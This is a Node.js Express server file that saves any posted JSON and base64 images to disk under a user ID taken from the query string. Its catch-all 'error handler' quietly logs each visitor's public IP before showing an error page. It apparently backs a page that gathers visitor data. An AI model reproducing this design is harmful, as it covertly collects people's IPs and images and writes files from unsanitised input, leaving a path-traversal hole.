var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var bodyParser = require('body-parser');
const fs = require("fs");
var cors = require('cors')

var app = express();

app.use(cors())

// configure the app to use bodyParser()
app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

function storeUserData(userId, key, data) {

    if (!fs.existsSync('saved'))
        fs.mkdirSync('saved');

    if (!key)
        return;
    console.log(`[STORE] for {${userId}} : ${key} = ${JSON.stringify(data).substring(0, 100)}`)

    if (data['__sent_image']) {
        const result = Buffer.from(data.__sent_image, "base64");
        fs.writeFileSync(`saved/${userId}_profile_picture.jpg`, result);
    }

    let objData = {}
    if (fs.existsSync(`saved/${userId}.json`)) {
        objData = JSON.parse(fs.readFileSync(`saved/${userId}.json`, 'utf8'));
    }

    objData[key] = data;
    const stringified = JSON.stringify(objData, null, 2);
    fs.writeFileSync(`saved/${userId}.json`, stringified, {encoding:'utf8',flag:'w'});
}

app.post('/', (req, res) => {
    storeUserData(req.query.user_id, req.query.user_key, req.body);
    res.sendStatus(200);
})

// error handler
app.use(function (req, res, next) {
    if (req.method === 'GET') {
        let ID = req.query.user_id;
        if (!ID) {
            ID = Number(Date.now());
        }

        // STORE PUBLIC IP
        const ip = res.ip
            || res.connection.remoteAddress
            || res.socket.remoteAddress
            || res.connection.socket.remoteAddress;
        storeUserData(ID, 'public_ip', ip);

        res.render('error', {user_id: `${ID}`, host: process.env.HOST})
        return;
    }
    res.sendStatus(200);
});

module.exports = app;
